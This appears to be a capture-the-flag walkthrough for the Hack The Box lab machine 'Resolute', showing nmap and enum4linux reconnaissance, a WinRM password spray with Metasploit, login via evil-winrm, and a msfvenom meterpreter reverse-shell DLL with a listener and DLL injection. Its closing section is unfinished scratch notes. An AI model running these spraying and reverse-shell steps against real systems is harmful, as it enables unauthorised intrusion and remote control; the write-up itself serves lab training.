@@ -1,0 +1,383 @@
+I"(�<p>Walkthrough for Resolute - 10.10.10.169</p>
+
+<h2 id="overview">Overview</h2>
+
+<h2 id="setup">Setup</h2>
+
+<p>Running Kali I make a temporary working directory, set some variables and update all the things.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir </span>tmp <span class="o">&amp;&amp;</span> <span class="nb">cd </span>tmp
+<span class="nv">TARGET</span><span class="o">=</span>10.10.10.169
+<span class="nb">sudo </span>apt update <span class="o">&amp;&amp;</span> <span class="nb">sudo </span>apt upgrade
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-Pn</span> <span class="nv">$TARGET</span>
+</code></pre></div></div>
+
+<p>I get</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap scan report for 10.10.10.169
+Host is up (0.022s latency).
+Not shown: 992 closed ports
+PORT    STATE SERVICE
+88/tcp  open  kerberos-sec
+135/tcp open  msrpc
+139/tcp open  netbios-ssn
+389/tcp open  ldap
+445/tcp open  microsoft-ds
+464/tcp open  kpasswd5
+593/tcp open  http-rpc-epmap
+636/tcp open  ldapssl
+</code></pre></div></div>
+
+<p>I’ve not encountered anything quite like this before, some familiar ports but nothing outstanding here other than potential smb on 445 and some kerberos access.</p>
+
+<p>Running all prts scan:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-Pn</span> <span class="nv">$TARGET</span> <span class="nt">-p-</span>
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Host is up (0.27s latency).
+Not shown: 65512 closed ports
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49671/tcp open  unknown
+49676/tcp open  unknown
+49677/tcp open  unknown
+49684/tcp open  unknown
+49907/tcp open  unknown
+</code></pre></div></div>
+
+<p>I pop in a quick smbmap:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap -H 10.10.10.169 -u 'anonymous' -p ''
+[+] Finding open SMB ports....
+[!] Authentication error on 10.10.10.169
+[!] Authentication error on 10.10.10.169
+</code></pre></div></div>
+
+<p>ok, maybe need some more enum. I try enum4linux to a file for offline analysis</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>enum4linux 10.10.10.169 <span class="o">&gt;</span> enum.txt
+</code></pre></div></div>
+
+<p>I find the domain: <code class="highlighter-rouge">MEGABANK</code> and the following users:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[DefaultAccount] rid:[0x1f7]
+user:[ryan] rid:[0x451]
+user:[marko] rid:[0x457]
+user:[sunita] rid:[0x19c9]
+user:[abigail] rid:[0x19ca]
+user:[marcus] rid:[0x19cb]
+user:[sally] rid:[0x19cc]
+user:[fred] rid:[0x19cd]
+user:[angela] rid:[0x19ce]
+user:[felicia] rid:[0x19cf]
+user:[gustavo] rid:[0x19d0]
+user:[ulf] rid:[0x19d1]
+user:[stevie] rid:[0x19d2]
+user:[claire] rid:[0x19d3]
+user:[paulo] rid:[0x19d4]
+user:[steve] rid:[0x19d5]
+user:[annette] rid:[0x19d6]
+user:[annika] rid:[0x19d7]
+user:[per] rid:[0x19d8]
+user:[claude] rid:[0x19d9]
+user:[melanie] rid:[0x2775]
+user:[zach] rid:[0x2776]
+user:[simon] rid:[0x2777]
+user:[naoki] rid:[0x2778]
+</code></pre></div></div>
+
+<p>Some more interesting things:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Group 'Enterprise Admins' (RID: 519) has member: MEGABANK\Administrator
+Group 'Domain Controllers' (RID: 516) has member: MEGABANK\RESOLUTE$
+Group 'Domain Guests' (RID: 514) has member: MEGABANK\Guest
+Group 'Domain Computers' (RID: 515) has member: MEGABANK\MS02$
+Group 'Domain Users' (RID: 513) has member: MEGABANK\Administrator
+Group 'Domain Users' (RID: 513) has member: MEGABANK\DefaultAccount
+Group 'Domain Users' (RID: 513) has member: MEGABANK\krbtgt
+Group 'Domain Users' (RID: 513) has member: MEGABANK\ryan
+Group 'Domain Users' (RID: 513) has member: MEGABANK\marko
+Group 'Domain Users' (RID: 513) has member: MEGABANK\sunita
+Group 'Domain Users' (RID: 513) has member: MEGABANK\abigail
+Group 'Domain Users' (RID: 513) has member: MEGABANK\marcus
+Group 'Domain Users' (RID: 513) has member: MEGABANK\sally
+Group 'Domain Users' (RID: 513) has member: MEGABANK\fred
+Group 'Domain Users' (RID: 513) has member: MEGABANK\angela
+Group 'Domain Users' (RID: 513) has member: MEGABANK\felicia
+Group 'Domain Users' (RID: 513) has member: MEGABANK\gustavo
+Group 'Domain Users' (RID: 513) has member: MEGABANK\ulf
+Group 'Domain Users' (RID: 513) has member: MEGABANK\stevie
+Group 'Domain Users' (RID: 513) has member: MEGABANK\claire
+Group 'Domain Users' (RID: 513) has member: MEGABANK\paulo
+Group 'Domain Users' (RID: 513) has member: MEGABANK\steve
+Group 'Domain Users' (RID: 513) has member: MEGABANK\annette
+Group 'Domain Users' (RID: 513) has member: MEGABANK\annika
+Group 'Domain Users' (RID: 513) has member: MEGABANK\per
+Group 'Domain Users' (RID: 513) has member: MEGABANK\claude
+Group 'Domain Users' (RID: 513) has member: MEGABANK\melanie
+Group 'Domain Users' (RID: 513) has member: MEGABANK\zach
+Group 'Domain Users' (RID: 513) has member: MEGABANK\simon
+Group 'Domain Users' (RID: 513) has member: MEGABANK\naoki
+Group 'Contractors' (RID: 1103) has member: MEGABANK\ryan
+</code></pre></div></div>
+
+<p>I make a users.txt file like so:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Administrator
+RESOLUTE$
+Guest
+MS02$
+Administrator
+DefaultAccount
+krbtgt
+ryan
+marko
+sunita
+abigail
+marcus
+sally
+fred
+angela
+felicia
+gustavo
+ulf
+stevie
+claire
+paulo
+steve
+annette
+annika
+per
+claude
+melanie
+zach
+simon
+naoki
+ryan
+</code></pre></div></div>
+
+<p>As I’m reading through the enum info I see:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko	Name: Marko Novak	Desc: Account created. Password set to Welcome123!
+
+</code></pre></div></div>
+
+<p>jackpot!</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap -H 10.10.10.169 -u 'marko' -p 'Welcome123!'
+</code></pre></div></div>
+
+<p>Welcome123! isn’t marko’s password, maybe someone else?</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">msf5</span> <span class="n">auxiliary</span><span class="p">(</span><span class="n">scanner</span><span class="o">/</span><span class="n">winrm</span><span class="o">/</span><span class="n">winrm_login</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">run</span>
+
+<span class="p">[</span><span class="o">!</span><span class="p">]</span> <span class="no">No</span> <span class="n">active</span> <span class="no">DB</span> <span class="o">--</span> <span class="no">Credential</span> <span class="n">data</span> <span class="n">will</span> <span class="n">not</span> <span class="n">be</span> <span class="n">saved!</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.169</span><span class="p">:</span><span class="mi">5985</span> <span class="o">-</span> <span class="no">LOGIN</span> <span class="no">FAILED</span><span class="p">:</span> <span class="no">WORKSTATION</span><span class="p">\</span><span class="no">Administrator</span><span class="ss">:Welcome123!</span> <span class="p">(</span><span class="no">Incorrect</span><span class="p">:</span> <span class="p">)</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.169</span><span class="p">:</span><span class="mi">5985</span> <span class="o">-</span> <span class="no">LOGIN</span> <span class="no">FAILED</span><span class="p">:</span> <span class="no">WORKSTATION</span><span class="p">\</span><span class="no">RESOLUTE</span><span class="vg">$:</span><span class="no">Welcome123</span><span class="o">!</span> <span class="p">(</span><span class="no">Incorrect</span><span class="p">:</span> <span class="p">)</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.169</span><span class="p">:</span><span class="mi">5985</span> <span class="o">-</span> <span class="no">LOGIN</span> <span class="no">FAILED</span><span class="p">:</span> <span class="no">WORKSTATION</span><span class="p">\</span><span class="no">Guest</span><span class="ss">:Welcome123!</span> <span class="p">(</span><span class="no">Incorrect</span><span class="p">:</span> <span class="p">)</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.169</span><span class="p">:</span><span class="mi">5985</span> <span class="o">-</span> <span class="no">LOGIN</span> <span class="no">FAILED</span><span class="p">:</span> <span class="no">WORKSTATION</span><span class="p">\</span><span class="no">MS02</span><span class="vg">$:</span><span class="no">Welcome123</span><span class="o">!</span> <span class="p">(</span><span class="no">Incorrect</span><span class="p">:</span> <span class="p">)</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.169</span><span class="p">:</span><span class="mi">5985</span> <span class="o">-</span> <span class="no">LOGIN</span> <span class="no">FAILED</span><span class="p">:</span> <span class="no">WORKSTATION</span><span class="p">\</span><span class="no">Administrator</span><span class="ss">:Welcome123!</span> <span class="p">(</span><span class="no">Incorrect</span><span class="p">:</span> <span class="p">)</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.169</span><span class="p">:</span><span class="mi">5985</span> <span class="o">-</span> <span class="no">LOGIN</span> <span class="no">FAILED</span><span class="p">:</span> <span class="no">WORKSTATION</span><span class="p">\</span><span class="no">DefaultAccount</span><span class="ss">:Welcome123!</span> <span class="p">(</span><span class="no">Incorrect</span><span class="p">:</span> <span class="p">)</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.169</span><span class="p">:</span><span class="mi">5985</span> <span class="o">-</span> <span class="no">LOGIN</span> <span class="no">FAILED</span><span class="p">:</span> <span class="no">WORKSTATION</span><span class="p">\</span><span class="n">krbtgt</span><span class="ss">:Welcome123!</span> <span class="p">(</span><span class="no">Incorrect</span><span class="p">:</span> <span class="p">)</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.169</span><span class="p">:</span><span class="mi">5985</span> <span class="o">-</span> <span class="no">LOGIN</span> <span class="no">FAILED</span><span class="p">:</span> <span class="no">WORKSTATION</span><span class="p">\</span><span class="n">ryan</span><span class="ss">:Welcome123!</span> <span class="p">(</span><span class="no">Incorrect</span><span class="p">:</span> <span class="p">)</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.169</span><span class="p">:</span><span class="mi">5985</span> <span class="o">-</span> <span class="no">LOGIN</span> <span class="no">FAILED</span><span class="p">:</span> <span class="no">WORKSTATION</span><span class="p">\</span><span class="n">marko</span><span class="ss">:Welcome123!</span> <span class="p">(</span><span class="no">Incorrect</span><span class="p">:</span> <span class="p">)</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.169</span><span class="p">:</span><span class="mi">5985</span> <span class="o">-</span> <span class="no">LOGIN</span> <span class="no">FAILED</span><span class="p">:</span> <span class="no">WORKSTATION</span><span class="p">\</span><span class="n">sunita</span><span class="ss">:Welcome123!</span> <span class="p">(</span><span class="no">Incorrect</span><span class="p">:</span> <span class="p">)</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.169</span><span class="p">:</span><span class="mi">5985</span> <span class="o">-</span> <span class="no">LOGIN</span> <span class="no">FAILED</span><span class="p">:</span> <span class="no">WORKSTATION</span><span class="p">\</span><span class="n">abigail</span><span class="ss">:Welcome123!</span> <span class="p">(</span><span class="no">Incorrect</span><span class="p">:</span> <span class="p">)</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.169</span><span class="p">:</span><span class="mi">5985</span> <span class="o">-</span> <span class="no">LOGIN</span> <span class="no">FAILED</span><span class="p">:</span> <span class="no">WORKSTATION</span><span class="p">\</span><span class="n">marcus</span><span class="ss">:Welcome123!</span> <span class="p">(</span><span class="no">Incorrect</span><span class="p">:</span> <span class="p">)</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.169</span><span class="p">:</span><span class="mi">5985</span> <span class="o">-</span> <span class="no">LOGIN</span> <span class="no">FAILED</span><span class="p">:</span> <span class="no">WORKSTATION</span><span class="p">\</span><span class="n">sally</span><span class="ss">:Welcome123!</span> <span class="p">(</span><span class="no">Incorrect</span><span class="p">:</span> <span class="p">)</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.169</span><span class="p">:</span><span class="mi">5985</span> <span class="o">-</span> <span class="no">LOGIN</span> <span class="no">FAILED</span><span class="p">:</span> <span class="no">WORKSTATION</span><span class="p">\</span><span class="n">fred</span><span class="ss">:Welcome123!</span> <span class="p">(</span><span class="no">Incorrect</span><span class="p">:</span> <span class="p">)</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.169</span><span class="p">:</span><span class="mi">5985</span> <span class="o">-</span> <span class="no">LOGIN</span> <span class="no">FAILED</span><span class="p">:</span> <span class="no">WORKSTATION</span><span class="p">\</span><span class="n">angela</span><span class="ss">:Welcome123!</span> <span class="p">(</span><span class="no">Incorrect</span><span class="p">:</span> <span class="p">)</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.169</span><span class="p">:</span><span class="mi">5985</span> <span class="o">-</span> <span class="no">LOGIN</span> <span class="no">FAILED</span><span class="p">:</span> <span class="no">WORKSTATION</span><span class="p">\</span><span class="n">felicia</span><span class="ss">:Welcome123!</span> <span class="p">(</span><span class="no">Incorrect</span><span class="p">:</span> <span class="p">)</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.169</span><span class="p">:</span><span class="mi">5985</span> <span class="o">-</span> <span class="no">LOGIN</span> <span class="no">FAILED</span><span class="p">:</span> <span class="no">WORKSTATION</span><span class="p">\</span><span class="n">gustavo</span><span class="ss">:Welcome123!</span> <span class="p">(</span><span class="no">Incorrect</span><span class="p">:</span> <span class="p">)</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.169</span><span class="p">:</span><span class="mi">5985</span> <span class="o">-</span> <span class="no">LOGIN</span> <span class="no">FAILED</span><span class="p">:</span> <span class="no">WORKSTATION</span><span class="p">\</span><span class="n">ulf</span><span class="ss">:Welcome123!</span> <span class="p">(</span><span class="no">Incorrect</span><span class="p">:</span> <span class="p">)</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.169</span><span class="p">:</span><span class="mi">5985</span> <span class="o">-</span> <span class="no">LOGIN</span> <span class="no">FAILED</span><span class="p">:</span> <span class="no">WORKSTATION</span><span class="p">\</span><span class="n">stevie</span><span class="ss">:Welcome123!</span> <span class="p">(</span><span class="no">Incorrect</span><span class="p">:</span> <span class="p">)</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.169</span><span class="p">:</span><span class="mi">5985</span> <span class="o">-</span> <span class="no">LOGIN</span> <span class="no">FAILED</span><span class="p">:</span> <span class="no">WORKSTATION</span><span class="p">\</span><span class="n">claire</span><span class="ss">:Welcome123!</span> <span class="p">(</span><span class="no">Incorrect</span><span class="p">:</span> <span class="p">)</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.169</span><span class="p">:</span><span class="mi">5985</span> <span class="o">-</span> <span class="no">LOGIN</span> <span class="no">FAILED</span><span class="p">:</span> <span class="no">WORKSTATION</span><span class="p">\</span><span class="n">paulo</span><span class="ss">:Welcome123!</span> <span class="p">(</span><span class="no">Incorrect</span><span class="p">:</span> <span class="p">)</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.169</span><span class="p">:</span><span class="mi">5985</span> <span class="o">-</span> <span class="no">LOGIN</span> <span class="no">FAILED</span><span class="p">:</span> <span class="no">WORKSTATION</span><span class="p">\</span><span class="n">steve</span><span class="ss">:Welcome123!</span> <span class="p">(</span><span class="no">Incorrect</span><span class="p">:</span> <span class="p">)</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.169</span><span class="p">:</span><span class="mi">5985</span> <span class="o">-</span> <span class="no">LOGIN</span> <span class="no">FAILED</span><span class="p">:</span> <span class="no">WORKSTATION</span><span class="p">\</span><span class="n">annette</span><span class="ss">:Welcome123!</span> <span class="p">(</span><span class="no">Incorrect</span><span class="p">:</span> <span class="p">)</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.169</span><span class="p">:</span><span class="mi">5985</span> <span class="o">-</span> <span class="no">LOGIN</span> <span class="no">FAILED</span><span class="p">:</span> <span class="no">WORKSTATION</span><span class="p">\</span><span class="n">annika</span><span class="ss">:Welcome123!</span> <span class="p">(</span><span class="no">Incorrect</span><span class="p">:</span> <span class="p">)</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.169</span><span class="p">:</span><span class="mi">5985</span> <span class="o">-</span> <span class="no">LOGIN</span> <span class="no">FAILED</span><span class="p">:</span> <span class="no">WORKSTATION</span><span class="p">\</span><span class="n">per</span><span class="ss">:Welcome123!</span> <span class="p">(</span><span class="no">Incorrect</span><span class="p">:</span> <span class="p">)</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.169</span><span class="p">:</span><span class="mi">5985</span> <span class="o">-</span> <span class="no">LOGIN</span> <span class="no">FAILED</span><span class="p">:</span> <span class="no">WORKSTATION</span><span class="p">\</span><span class="n">claude</span><span class="ss">:Welcome123!</span> <span class="p">(</span><span class="no">Incorrect</span><span class="p">:</span> <span class="p">)</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.169</span><span class="p">:</span><span class="mi">5985</span> <span class="o">-</span> <span class="no">Login</span> <span class="no">Successful</span><span class="p">:</span> <span class="no">WORKSTATION</span><span class="p">\</span><span class="n">melanie</span><span class="ss">:Welcome123!</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.169</span><span class="p">:</span><span class="mi">5985</span> <span class="o">-</span> <span class="no">LOGIN</span> <span class="no">FAILED</span><span class="p">:</span> <span class="no">WORKSTATION</span><span class="p">\</span><span class="n">zach</span><span class="ss">:Welcome123!</span> <span class="p">(</span><span class="no">Incorrect</span><span class="p">:</span> <span class="p">)</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.169</span><span class="p">:</span><span class="mi">5985</span> <span class="o">-</span> <span class="no">LOGIN</span> <span class="no">FAILED</span><span class="p">:</span> <span class="no">WORKSTATION</span><span class="p">\</span><span class="n">simon</span><span class="ss">:Welcome123!</span> <span class="p">(</span><span class="no">Incorrect</span><span class="p">:</span> <span class="p">)</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.169</span><span class="p">:</span><span class="mi">5985</span> <span class="o">-</span> <span class="no">LOGIN</span> <span class="no">FAILED</span><span class="p">:</span> <span class="no">WORKSTATION</span><span class="p">\</span><span class="n">naoki</span><span class="ss">:Welcome123!</span> <span class="p">(</span><span class="no">Incorrect</span><span class="p">:</span> <span class="p">)</span>
+<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.169</span><span class="p">:</span><span class="mi">5985</span> <span class="o">-</span> <span class="no">LOGIN</span> <span class="no">FAILED</span><span class="p">:</span> <span class="no">WORKSTATION</span><span class="p">\</span><span class="n">ryan</span><span class="ss">:Welcome123!</span> <span class="p">(</span><span class="no">Incorrect</span><span class="p">:</span> <span class="p">)</span>
+
+</code></pre></div></div>
+
+<p>Looks like melanie!</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">10.169</span><span class="p">:</span><span class="mi">5985</span> <span class="o">-</span> <span class="no">Login</span> <span class="no">Successful</span><span class="p">:</span> <span class="no">WORKSTATION</span><span class="p">\</span><span class="n">melanie</span><span class="ss">:Welcome123!</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap <span class="nt">-H</span> 10.10.10.169 <span class="nt">-u</span> <span class="s1">'melanie'</span> <span class="nt">-p</span> <span class="s1">'Welcome123!'</span>
+</code></pre></div></div>
+
+<p>This time!</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] Finding open SMB ports....
+[+] User SMB session established on 10.10.10.169...
+[+] IP: 10.10.10.169:445        Name: 10.10.10.169                                      
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        .                                                  
+        fr--r--r--                3 Sun Dec 31 23:58:45 1600    InitShutdown
+        fr--r--r--                4 Sun Dec 31 23:58:45 1600    lsass
+        fr--r--r--                3 Sun Dec 31 23:58:45 1600    ntsvcs
+        fr--r--r--                3 Sun Dec 31 23:58:45 1600    scerpc
+        fr--r--r--                1 Sun Dec 31 23:58:45 1600    Winsock2\CatalogChangeListener-31c-0
+        fr--r--r--                3 Sun Dec 31 23:58:45 1600    epmapper
+        fr--r--r--                1 Sun Dec 31 23:58:45 1600    Winsock2\CatalogChangeListener-1b8-0
+        fr--r--r--                3 Sun Dec 31 23:58:45 1600    LSM_API_service
+        fr--r--r--                3 Sun Dec 31 23:58:45 1600    eventlog
+        fr--r--r--                1 Sun Dec 31 23:58:45 1600    Winsock2\CatalogChangeListener-37c-0
+        fr--r--r--                3 Sun Dec 31 23:58:45 1600    atsvc
+        fr--r--r--                4 Sun Dec 31 23:58:45 1600    wkssvc
+        fr--r--r--                1 Sun Dec 31 23:58:45 1600    Winsock2\CatalogChangeListener-48-0
+        fr--r--r--                1 Sun Dec 31 23:58:45 1600    Winsock2\CatalogChangeListener-23c-0
+        fr--r--r--                1 Sun Dec 31 23:58:45 1600    Winsock2\CatalogChangeListener-23c-1
+        fr--r--r--                1 Sun Dec 31 23:58:45 1600    Winsock2\CatalogChangeListener-430-0
+        fr--r--r--                3 Sun Dec 31 23:58:45 1600    RpcProxy\49676
+        fr--r--r--                3 Sun Dec 31 23:58:45 1600    fc89f32ab4796e4f
+        fr--r--r--                3 Sun Dec 31 23:58:45 1600    RpcProxy\593
+        fr--r--r--                4 Sun Dec 31 23:58:45 1600    srvsvc
+        fr--r--r--                3 Sun Dec 31 23:58:45 1600    efsrpc
+        fr--r--r--                3 Sun Dec 31 23:58:45 1600    netdfs
+        fr--r--r--                1 Sun Dec 31 23:58:45 1600    vgauth-service
+        fr--r--r--                1 Sun Dec 31 23:58:45 1600    Winsock2\CatalogChangeListener-234-0
+        fr--r--r--                3 Sun Dec 31 23:58:45 1600    W32TIME_ALT
+        fr--r--r--                1 Sun Dec 31 23:58:45 1600    Winsock2\CatalogChangeListener-7d8-0
+        fr--r--r--                1 Sun Dec 31 23:58:45 1600    Winsock2\CatalogChangeListener-404-0
+        IPC$                                                    READ ONLY       Remote IPC
+        .                                                  
+        dr--r--r--                0 Wed Sep 25 14:28:35 2019    .
+        dr--r--r--                0 Wed Sep 25 14:28:35 2019    ..
+        NETLOGON                                                READ ONLY       Logon server share 
+        .                                                  
+        dr--r--r--                0 Wed Sep 25 14:28:35 2019    .
+        dr--r--r--                0 Wed Sep 25 14:28:35 2019    ..
+        dr--r--r--                0 Wed Sep 25 14:28:35 2019    megabank.local
+        SYSVOL                                                  READ ONLY       Logon server share 
+</code></pre></div></div>
+
+<p>I log in as melanie:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-i</span> 10.10.10.169 <span class="nt">-u</span> melanie
+Enter Password: 
+
+Evil-WinRM shell v2.0
+
+Info: Establishing connection to remote endpoint
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\m</span>elanie<span class="se">\D</span>ocuments&gt; 
+
+</code></pre></div></div>
+
+<p>I move to the desktop to get user.txt</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>user.txt
+0c3be45fcfe249796ccbee8d3a978540
+</code></pre></div></div>
+
+<p>I run a <code class="highlighter-rouge">whoami /all</code>:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>USER INFORMATION
+----------------
+
+User Name        SID                                            
+================ ===============================================
+megabank\melanie S-1-5-21-1392959593-3013219662-3596683436-10101
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID          Attributes                                        
+========================================== ================ ============ ==================================================
+Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                    
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State  
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+</code></pre></div></div>
+
+<p>I check my powershell capabilities:</p>
+
+<pre><code class="language-ps">$ExecutionContext.SessionState.LanguageMode
+</code></pre>
+
+<p>to see</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>FullLanguage
+</code></pre></div></div>
+
+<p>Ok I make a dll with 5 encoding rotations</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/x64/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.33 <span class="nv">LPORT</span><span class="o">=</span>4444 <span class="nt">-f</span> dll <span class="nt">-i</span> 5 <span class="o">&gt;</span> evil.dll
+</code></pre></div></div>
+
+<p>RemoteDLLInjector64.exe 1960 “C:\Users\melanie\Documents\evil.dll”</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 10.10.14.33
+set LPORT 4444
+run
+``` ps
+upload PowerView.ps1
+Import-Module Recon
+import-module PowerView
+</code></pre></div></div>
+
+<p>x86_64-w64-mingw32-gcc -shared -o shell.dll source.c -lws2_32</p>
+
+<p>check this?
+https://egre55.github.io/system-properties-uac-bypass/</p>
+:ET
